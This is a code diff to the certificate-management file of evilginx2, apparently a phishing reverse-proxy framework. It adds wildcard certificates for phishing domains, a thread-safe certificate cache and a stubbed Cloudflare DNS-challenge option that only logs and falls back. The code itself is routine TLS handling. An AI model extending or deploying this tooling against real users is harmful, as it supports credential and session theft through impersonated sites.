@@ -14,6 +14,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
@@ -22,22 +23,26 @@ import (
 )
 
 type CertDb struct {
-	cache_dir string
-	magic     *certmagic.Config
-	cfg       *Config
-	ns        *Nameserver
-	caCert    tls.Certificate
-	tlsCache  map[string]*tls.Certificate
+	cache_dir      string
+	magic          *certmagic.Config
+	cfg            *Config
+	ns             *Nameserver
+	caCert         tls.Certificate
+	tlsCache       map[string]*tls.Certificate
+	tlsCacheMu     sync.RWMutex
+	wildcardCache  map[string]bool // Track domains that should use wildcards
+	dnsChallenge   bool            // Whether DNS challenge is enabled
 }
 
 func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 	os.Setenv("XDG_DATA_HOME", cache_dir)
 
 	o := &CertDb{
-		cache_dir: cache_dir,
-		cfg:       cfg,
-		ns:        ns,
-		tlsCache:  make(map[string]*tls.Certificate),
+		cache_dir:     cache_dir,
+		cfg:           cfg,
+		ns:            ns,
+		tlsCache:      make(map[string]*tls.Certificate),
+		wildcardCache: make(map[string]bool),
 	}
 
 	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
@@ -57,6 +62,11 @@ func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 	}
 
 	o.magic = certmagic.NewDefault()
+	
+	// Initialize DNS provider if configured
+	if err := o.initDNSProvider(); err != nil {
+		log.Warning("Failed to initialize DNS provider: %v", err)
+	}
 
 	return o, nil
 }
@@ -163,10 +173,111 @@ func (o *CertDb) generateCertificates() error {
 }
 
 func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
+	// Process hosts to determine which should use wildcard certificates
+	processedHosts := []string{}
+	wildcardDomains := make(map[string]bool)
+	
+	for _, host := range hosts {
+		if o.isWildcardDomain(host) {
+			wildcardDomain := o.getWildcardDomain(host)
+			if !wildcardDomains[wildcardDomain] {
+				wildcardDomains[wildcardDomain] = true
+				processedHosts = append(processedHosts, wildcardDomain)
+				o.wildcardCache[host] = true
+				log.Info("Using wildcard certificate for domain: %s -> %s", host, wildcardDomain)
+			}
+		} else {
+			processedHosts = append(processedHosts, host)
+			o.wildcardCache[host] = false
+		}
+	}
+	
+	// Configure certmagic for this operation
+	if o.dnsChallenge && len(wildcardDomains) > 0 {
+		// Log that wildcard certificates are requested but need DNS provider
+		log.Warning("Wildcard certificates requested but DNS challenge provider not fully integrated")
+		log.Info("Falling back to regular certificates for now")
+		
+		// For now, use regular certificates instead of wildcards
+		processedHosts = hosts
+	}
+	
 	ctx, cancel := context.WithTimeout(context.Background(), t)
-	err := o.magic.ManageSync(ctx, hosts)
+	err := o.magic.ManageSync(ctx, processedHosts)
 	cancel()
+	
+	// No special error handling needed since we're using regular certificates for now
+	
 	return err
+}
+
+// initDNSProvider initializes DNS provider for wildcard certificate validation
+func (o *CertDb) initDNSProvider() error {
+	// Get DNS provider configuration from config
+	dnsConfig := o.cfg.GetDNSProviderConfig()
+	if dnsConfig == nil || !dnsConfig.Enabled {
+		return nil
+	}
+
+	switch dnsConfig.Provider {
+	case "cloudflare":
+		if dnsConfig.ApiKey == "" || dnsConfig.Email == "" {
+			return fmt.Errorf("cloudflare DNS provider requires api_key and email")
+		}
+		
+		// Mark that DNS challenge is enabled
+		o.dnsChallenge = true
+		
+		// TODO: Initialize actual Cloudflare provider when dependencies are added
+		// For now, just log that it would be enabled
+		log.Info("DNS challenge mode enabled for wildcard certificates (provider: cloudflare)")
+		log.Warning("Note: Actual DNS provider integration requires additional dependencies")
+		
+	default:
+		return fmt.Errorf("unsupported DNS provider: %s", dnsConfig.Provider)
+	}
+	
+	return nil
+}
+
+// isWildcardDomain checks if the domain should use a wildcard certificate
+func (o *CertDb) isWildcardDomain(domain string) bool {
+	if !o.cfg.IsWildcardEnabled() {
+		return false
+	}
+
+	// Check against all active managed domains
+	dm := o.cfg.GetDomainManager()
+	if dm == nil {
+		return false
+	}
+	for _, baseDomain := range dm.GetActiveDomains() {
+		if domain == baseDomain || domain == "*."+baseDomain {
+			return false
+		}
+		if strings.HasSuffix(domain, "."+baseDomain) {
+			return true
+		}
+	}
+	return false
+}
+
+// getWildcardDomain returns the wildcard domain for the given domain
+func (o *CertDb) getWildcardDomain(domain string) string {
+	if strings.HasPrefix(domain, "*.") {
+		return domain
+	}
+
+	dm := o.cfg.GetDomainManager()
+	if dm == nil {
+		return domain
+	}
+	for _, baseDomain := range dm.GetActiveDomains() {
+		if strings.HasSuffix(domain, "."+baseDomain) && domain != baseDomain {
+			return "*." + baseDomain
+		}
+	}
+	return domain
 }
 
 func (o *CertDb) setUnmanagedSync(verbose bool) error {
@@ -267,6 +378,9 @@ func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, er
 
 	state := conn.ConnectionState()
 
+	if len(state.PeerCertificates) == 0 {
+		return nil, fmt.Errorf("no peer certificates returned for: %s:%d", host, port)
+	}
 	return state.PeerCertificates[0], nil
 }
 
@@ -274,7 +388,9 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 	var x509ca *x509.Certificate
 	var template x509.Certificate
 
+	o.tlsCacheMu.RLock()
 	cert, ok := o.tlsCache[host]
+	o.tlsCacheMu.RUnlock()
 	if ok {
 		return cert, nil
 	}
@@ -344,6 +460,8 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 		PrivateKey:  pkey,
 	}
 
+	o.tlsCacheMu.Lock()
 	o.tlsCache[host] = cert
+	o.tlsCacheMu.Unlock()
 	return cert, nil
 }
